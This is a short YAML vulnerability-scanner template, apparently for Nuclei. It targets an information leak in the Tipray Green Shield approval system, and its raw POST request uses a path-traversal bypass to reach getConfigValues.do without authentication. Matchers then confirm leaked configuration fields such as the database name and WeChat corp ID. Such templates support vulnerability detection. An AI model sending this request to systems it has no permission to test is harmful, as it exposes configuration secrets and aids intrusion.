id: poc-yaml-tipray-gsas-getconfigvalues-do-info-leak

info:
  name: 天锐绿盾审批系统 getConfigValues.do 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: information-disclosure
  metadata:
    fingerprint: 天锐绿盾审批系统

http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/config/getConfigValues.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"ld.apply.reason.appoint\":"
          - "\"wx.corpid\":"
          - "\"db.name\":"
          - "com.tipray.mobileplatform"
      - type: word
        part: body
        words:
          - "<"
        negative: true
